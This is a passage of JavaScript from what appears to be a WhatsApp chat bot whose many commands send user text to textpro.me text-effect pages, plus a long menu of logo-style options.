  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'steel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'harrpotter':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'underwater':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'luxury':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'glue2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neonlight':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'lava':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'toxic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'christmas2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sci_fi':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'rainbow':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'classic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'watercolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweem2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweenfire':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'writing':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'foggy':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'skeleton2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sketch':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'wonderful':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'batman':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'juice':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
XeonBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
XeonBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuror2 = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anuror2)
XeonBotInc.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
XeonBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
//MAIN LOHO\\
break
            case 'logo': case 'logo1': {
            XeonBotInc.sendMessage(from, { react: { text: `🖼️`, key: m.key }})
	const sections = [{
								"title": "Initial Features Of Bot 🦁",
								"rows": [
									{
										"title": "LION",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `Lion ${text}`
									}
								]
							},
							{
								"title": "Bot Features 🦁",
								"rows": [
									{
										"title": "candy",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `candy ${text}`
									},
									{
										"title": "8bit",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `8bit ${text}`
										},
									{
										"title": "horror",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `horror ${text}`
										},
										{
										"title": "hoorror",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `hoorror ${text}`
										},
										{
										"title": "blackpinkneon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `blackpinkneon ${text}`
									},
									{
										"title": "retro",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `retro ${text}`
									},
									{
										"title": "deepsea️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `deepsea ${text}`
									},
									{
										"title": "scifi",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `scifi ${text}`
									},
									{
										"title": "fiction",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `fiction ${text}`
									},
									{
										"title": "berry️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `berry ${text}`
									},
									{
										"title": "fruitjuice",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `fruitjuice ${text}`
									},
									{
										"title": "biscuit️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `biscuit ${text}`
									},
										{
											"title": "wood",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `wood ${text}`
										},
										{
											"title": "chocolate",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `chocolate ${text}`
										},
										{
										"title": "matrix️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `matrix ${text}`
									     },
									{
										"title": "blood",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `blood ${text}`
									     },
										{
											"title": "halloween",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `halloween ${text}`
										},
										{
										"title": "darkgold",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `darkgold ${text}`
									},
										{
											"title": "firework️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `firework ${text}`
										},
										{
											"title": "skeleton️",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `skeleton ${text}`
										},
										{
										"title": "sand",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `sand ${text}`
									},
										{
											"title": "leaves",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `leaves ${text}`
										
								
							},
								{
										"title": "magma",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `magma ${text}`
									},
									{
										"title": "lava",
										"description": "Displays The List Of Owner Features",
										"rowId": `lava ${text}`
										},
									{
										"title": "rock",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `rock ${text}`
										},
										{
										"title": "bloodglas",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `bloodglas ${text}`
										},
										{
										"title": "underwater",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `underwater ${text}`
									},
									{
										"title": "textmaker",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `textmaker ${text}`
									},
									{
										"title": "honey",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `honey ${text}`
									},
									{
										"title": "ice",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `ice ${text}`
									},
									{
										"title": "watercolor",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `watercolor ${text}`
									},
									{
										"title": "multicolor",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `multicolor ${text}`
									},
									{
										"title": "snow",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `snow ${text}`
									},
									{
										"title": "harrypot",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `harrypot ${text}`
									},
										{
											"title": "harrypotter",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `harrypotter ${text}`
										},
										{
											"title": "brokenglass",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `brokenglass ${text}`
										},
										{
										"title": "waterpipe",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `waterpipe ${text}`
									     },
									{
										"title": "spooky",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `spooky ${text}`
									     },
										{
											"title": "circuit",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `circuit ${text}`
										},
										{
										"title": "metallic",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `metallic ${text}`
									},
										{
											"title": "sparklechristmas",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `sparklechristmas ${text}`
										},
										{
											"title": "demon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `demon ${text}`
										},
										{
										"title": "christmas",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `christmas ${text}`
									},
										{
											"title": "3dchristmas",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dchristmas ${text}`
										},{
										"title": "3dbox",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dbox ${text}`
									},
									{
										"title": "waterdrop",
										"description": "Displays The List Of Owner Features",
										"rowId": `waterdrop ${text}`
										},
									{
										"title": "papercut",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `papercut ${text}`
										},
										{
										"title": "transformer",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `transformer ${text}`
										},
										{
										"title": "neondevil",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `neondevil ${text}`
									},
									{
										"title": "3davengers",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3davengers ${text}`
									},
									{
										"title": "3dstone",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dstone ${text}`
									},
									{
										"title": "3dstone2",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dstone2 ${text}`
									},
									{
										"title": "summertime",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `summertime ${text}`
									},
									{
										"title": "thunder",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `thunder ${text}`
									},
									{
										"title": "window",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `window ${text}`
									},
									{
										"title": "graffiti",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `graffiti ${text}`
									},
										{
											"title": "graffitibike",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `graffitibike ${text}`
										},
										{
											"title": "pornhub",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `pornhub ${text}`
										},
										{
										"title": "glitch",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `glitch ${text}`
									     },
									{
										"title": "blackpink",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `blackpink ${text}`
									     },
										{
											"title": "glitch2",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `glitch2 ${text}`
										},
										{
										"title": "glitch3",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `glitch3 ${text}`
									},
										{
											"title": "3dspace",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dspace ${text}`
										},
										{
											"title": "3dneon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `3dneon ${text}`
										},
										{
										"title": "greenneon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `greenneon ${text}`
									},
										{
											"title": "bokeh",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `bokeh ${text}`
										
								
						    	},
								{
										"title": "holographic",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `holographic ${text}`
									},
									{
										"title": "bear",
										"description": "Displays The List Of Owner Features",
										"rowId": `bear ${text}`
										},
									{
										"title": "wolf",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `wolf ${text}`
										},
										{
										"title": "joker",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `joker ${text}`
										},
										{
										"title": "dropwater",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `dropwater ${text}`
									},
									{
										"title": "dropwater2",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `dropwater2 ${text}`
									},
									{
										"title": "thewall",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `thewall ${text}`
									},
									{
										"title": "neonlight",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `neonlight ${text}`
									},
									{
										"title": "natural",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `natural ${text}`
									},
									{
										"title": "carbon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `carbon ${text}`
									},
									{
										"title": "pencil",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `pencil ${text}`
									},
									{
										"title": "blackpink2",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `blackpink2 ${text}`
									},
										{
											"title": "neon",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `neon ${text}`
										},
										{
											"title": "neonlight2",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `neonlight2 ${text}`
										},
										{
										"title": "toxic",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `toxic ${text}`
									     },
									{
										"title": "strawberry",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `strawberry ${text}`
									     },
										{
											"title": "1917",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `1917 ${text}`
										},
										{
										"title": "sci_fi",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `sci_fi ${text}`
									},
										{
											"title": "ancient",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `ancient ${text}`
										},
										{
											"title": "fabric",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `fabric ${text}`
										},
										{
										"title": "hoorror",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `hoorror ${text}`
									},
										{
											"title": "whitebear",
										"description": "☬༒𝙥𝙧𝙖𝙢𝙚𝙨𝙝༆𝙡𝙞𝙤𝙣⃕ 𝙗𝙤𝙩༒",
										"rowId": `whitebear ${text}`
										}
								]
							},
							{
								"title": "LION LOGO2",
								"rows": [
									{
										"title": "lion2",
